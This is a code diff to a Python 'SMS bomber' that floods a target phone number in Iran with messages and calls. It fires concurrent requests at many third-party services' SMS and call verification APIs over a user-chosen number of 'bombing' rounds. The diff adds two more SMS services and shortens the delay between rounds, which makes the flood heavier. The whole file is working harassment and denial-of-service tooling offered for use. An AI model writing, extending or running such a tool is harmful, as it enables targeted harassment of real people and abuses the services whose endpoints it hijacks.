@@ -18,7 +18,8 @@ def bombing(phone , xx):
     phone = f"+98{phone[1::]}"
     count = 1
     while count <= xx:
-        Thread(target=sms.a4baz, args=[phone]).start()
+        Thread(target=sms.a4baz, args=[phone]).start()        
+        Thread(target=sms.gharar, args=[phone]).start()
         Thread(target=sms.abantether, args=[phone]).start()
         Thread(target=sms.achar, args=[phone]).start()
         Thread(target=sms.alibaba, args=[phone]).start()
@@ -192,6 +193,7 @@ def bombing(phone , xx):
         Thread(target=sms.torob, args=[phone]).start()
         Thread(target=sms.uphone, args=[phone]).start()
         Thread(target=sms.virgool, args=[phone]).start()
+        Thread(target=sms.watchonline, args=[phone]).start()
         Thread(target=sms.wis, args=[phone]).start()
         Thread(target=sms.zerocafe, args=[phone]).start()
         Thread(target=sms.zivanpet, args=[phone]).start()
@@ -200,13 +202,13 @@ def bombing(phone , xx):
            rnd_call = choice([call.ragham_call,call.paklean_call,call.novinbook_call,call.azki_call])
            Thread(target=rnd_call, args=[phone]).start()
         count += 1
-        sleep(0.3)
+        sleep(0.2)
     printLow(f"\033[32;1m[\033[1;33mFinished\033[32;1m]")
     exit()
 
 
 if __name__ == "__main__":
-    printLow(f"""\033[32;1m[+] \033[1;33mSMS Api's: \033[32;1m{sms_c}\n\033[32;1m[+] \033[1;33mCALL Api's: \033[32;1m{call_c}\n\033[32;1m[+] \033[1;33mDeveloper: \033[32;1m@Dev_Moon""")
+    printLow(f"""\033[32;1m[+] \033[1;33mSMS Api's: \033[32;1m{sms_c}\n\033[32;1m[+] \033[1;33mCALL Api's: \033[32;1m{call_c}\n\033[32;1m[+] \033[1;33mDeveloper: \033[32;1mt.me/Dev_Moon""")
     num = input(f'\n\n\033[32;1m[$] \033[1m\033[96mEnter Phone Number\n\033[1;33m  Ex:09190000000\n \033[1;31m-> \033[32;1m')
     yy = int(input("\n\033[32;1m[$] \033[1;33mEnter The Count of Round of Bombing\n\033[1;31m-> \033[32;1m"))
     system('clear' if name == 'posix' else 'cls')
